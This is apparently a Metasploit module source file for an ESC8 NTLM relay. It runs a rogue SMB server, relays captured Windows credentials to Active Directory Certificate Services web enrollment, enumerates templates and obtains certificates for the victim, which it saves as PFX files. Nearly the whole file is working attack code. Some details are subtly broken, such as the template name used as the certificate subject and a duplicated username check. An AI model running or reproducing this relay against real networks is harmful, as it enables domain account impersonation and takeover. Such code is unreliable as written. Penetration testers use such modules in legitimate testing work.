##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'
require 'ruby_smb/gss/provider/ntlm'

class MetasploitModule < Msf::Auxiliary
  include ::Msf::Exploit::Remote::SMB::Server
  include ::Msf::Exploit::Remote::SMB::Server::HttpRelay

  def initialize
    super({
      'Name' => 'ESC8 Relay: SMB',
      'Description' => %q{
      This module creates an SMB server and then relays the credentials passed to it
      to an HTTP server to gain an authenticated connection.  Once that connection is
      established, the module makes an authenticated request for a certificate based
      on a given template.
      },
      'Author' => [
        'bwatters-r7',
        'jhicks-r7' # query for available certs
      ],
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Relay', { 'Description' => 'Run SMB ESC8 relay server' } ]],
      'PassiveActions' => [ 'Relay' ],
      'DefaultAction' => 'Relay'
    })

    register_options(
      [
        OptString.new('CERT_TEMPLATE', [ false, 'The user to issue the certificate for.', nil ]),
        OptString.new('CERT_URI', [ true, 'The URI for the cert server.', '/certsrv/' ]),
        OptBool.new('QUERY_TEMPLATES', [ true, 'Query certificate templates and print them before attempting to use them', true ]),
        OptBool.new('QUERY_ONLY', [ true, 'Only use the relay to get a list of templates; do not generate certificates.', false ]),
        OptAddress.new('RELAY_TARGET', [true, 'Target address range or CIDR identifier to relay to'], aliases: ['SMBHOST']),
        OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 445 ]),
        OptInt.new('TIMEOUT', [ true, 'Seconds to wait for a response.', 20])
      ]
    )
    register_advanced_options(
      [
        OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true]),

      ]
    )
    deregister_options('SMBServerIdleTimeout', 'RHOSTS', 'SMBPass', 'SMBUser', 'CommandShellCleanupCommand', 'AutoVerifySession')
  end

  def initial_handshake?
    vprint_status('Verifying HTTP Relay target Has Web Enrollment enabled')
    res = send_request_cgi(
      {
        'rhost' => datastore['RELAY_TARGET'],
        'method' => 'GET',
        'uri' => normalize_uri(datastore['CERT_URI']),
        'headers' => {
          'Accept-Encoding' => 'identity'
        }
      }
    )

    return false if res.code != 401

    return true
  end

  def start_service(opts = {})
    unless initial_handshake?
      fail_with(Failure::UnexpectedReply, "#{datastore['RELAY_TARGET']} does not appear to have Web enrollment enabled on #{datastore['CERT_URI']}")
    end

    ntlm_provider = HTTPRelayNTLMProvider.new(
      listener: self
    )

    # Set domain name for all future server responses
    ntlm_provider.dns_domain = datastore['SMBDomain']
    ntlm_provider.dns_hostname = datastore['SMBDomain']
    ntlm_provider.netbios_domain = datastore['SMBDomain']
    ntlm_provider.netbios_hostname = datastore['SMBDomain']
    validate_smb_hash_capture_datastore(datastore, ntlm_provider)
    opts[:gss_provider] = ntlm_provider
    super(opts)
  end

  def on_client_connect(_client)
    @login_uri = normalize_uri("#{datastore['CERT_URI']}/csertfnsh.asp")
    @http_timeout = datastore['TIMEOUT']
    print_good('Received SMB connection on ESC8 Relay Server!')
  end

  alias run exploit

  def create_csr(private_key, authenticated_user)
    vprint_status('Generating CSR...')
    request = OpenSSL::X509::Request.new
    request.version = 1
    request.subject = OpenSSL::X509::Name.new([
      ['CN', authenticated_user, OpenSSL::ASN1::UTF8STRING]
    ])
    request.public_key = private_key.public_key
    request.sign(private_key, OpenSSL::Digest.new('SHA256'))
    vprint_status('CSR Generated')
    return request
  end

  def exit_with_error(_error_string)
    print_error
  end

  def post_login_action(kwargs = {})
    authenticated_username = kwargs[:authenticated_username]
    authenticated_http_client = kwargs[:authenticated_http_client]
    authenticated_domain = kwargs[:authenticated_domain]

    if authenticated_username.nil?
      print_error('esc8_relay: Post Login Action requires an authenticated username')
      return nil
    end
    if authenticated_http_client.nil?
      print_error('esc8_relay: Failed to authenticate')
      return nil
    end
    if authenticated_username.nil?
      print_error('esc8_relay: Post Login Action requires an authenticated domain')
      return nil
    end

    cert_list = nil
    if datastore['QUERY_TEMPLATES']
      print_status('Querying certificate templates; this may take some time')
      cert_list = get_cert_list(authenticated_http_client)
      if cert_list.nil? || cert_list.empty?
        print_bad('http_relay failed to query cert_list') if cert_list.nil?
        print_bad('http_relay returned no available certs') if cert_list.empty?
      else
        print_status('Available Certificates:')
        cert_list.each do |cert_entry|
          print_status(cert_entry)
        end
      end
    end
    unless datastore['QUERY_ONLY']
      if cert_list.nil? || cert_list.empty? || cert_list.include?(datastore['CERT_TEMPLATE'])
        # if we don't have a cert list or if the cert is in the list, just generate that cert
        retrieve_cert(datastore['CERT_TEMPLATE'], authenticated_username, authenticated_domain, authenticated_http_client)
      else
        # if we have a cert list and the desired template is not there
        # or the desired template is nil, just issue all available certs
        print_bad("#{datastore['CERT_TEMPLATE']} not found in available certificates") unless datastore['CERT_TEMPLATE'].nil?
        print_status('Attempting to generate certificates for all templates')
        cert_list.each do |cert_entry|
          retrieve_cert(cert_entry, authenticated_username, authenticated_domain, authenticated_http_client)
        end
      end
    end
  end

  def get_cert_list(client_socket)
    req = client_socket.request_raw(
      {
        'method' => 'GET',
        'uri' => "#{datastore['CERT_URI']}/certrqxt.asp"
      }
    )
    res = client_socket._send_recv(req, @http_timeout, true)
    raw_list = res.body.scan(/^.*Option Value="E;(.*?);/)
    user_list = []
    raw_list.each do |element|
      user_list.append(element[0])
    end
    return user_list
  end

  def retrieve_cert(cert_template, authenticated_user, authenticated_domain, authenticated_http_client)
    vprint_status("Sending Post to generate certificate for #{authenticated_user} using the #{cert_template} template")
    private_key = OpenSSL::PKey::RSA.new(4096)
    request = create_csr(private_key, cert_template)
    cert_template_string = "CertificateTemplate:#{cert_template}"
    req = authenticated_http_client.request_cgi(
      {
        'method' => 'POST',
        'uri' => "#{datastore['CERT_URI']}/certfnsh.asp",
        'ctype' => 'application/x-www-form-urlencoded',
        'vars_post' => {
          'Mode' => 'newreq',
          'CertRequest' => request.to_s,
          'CertAttrib' => cert_template_string,
          'TargetStoreFlags' => 0,
          'SaveCert' => 'yes',
          'ThumbPrint' => ''
        }
      }
    )
    res = authenticated_http_client._send_recv(req, @http_timeout, true)
    vprint_status('Post Sent')
    if res&.code == 200 && !res.body.include?('request was denied')
      print_good("Certificate Request Granted using template #{cert_template} and user #{authenticated_user}")
    else
      print_bad("Certificate Request Denied using template #{cert_template} and user #{authenticated_user}")
      return false
    end

    location_tag = res.body.match(/^.*location="(.*)"/)[1]
    vprint_status("Certificate location tag = #{location_tag}")
    location_uri = "#{datastore['CERT_URI']}/#{location_tag}"
    vprint_status('Requesting Certificate from Relay Target...')
    req = authenticated_http_client.request_cgi(
      {
        'method' => 'GET',
        'uri' => location_uri
      }
    )
    res = authenticated_http_client._send_recv(req, @http_timeout, true)
    info = "#{authenticated_domain}\\#{authenticated_user} Certificate"
    certificate = OpenSSL::X509::Certificate.new(res.body)
    pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)
    stored_path = store_loot('windows.ad.cs',
                             'application/x-pkcs12',
                             rhost,
                             pkcs12.to_der,
                             'certificate.pfx',
                             info)
    print_status("Certificate for #{authenticated_domain}\\#{authenticated_user} using template #{cert_template} saved to #{stored_path}")
    return certificate
  end

end
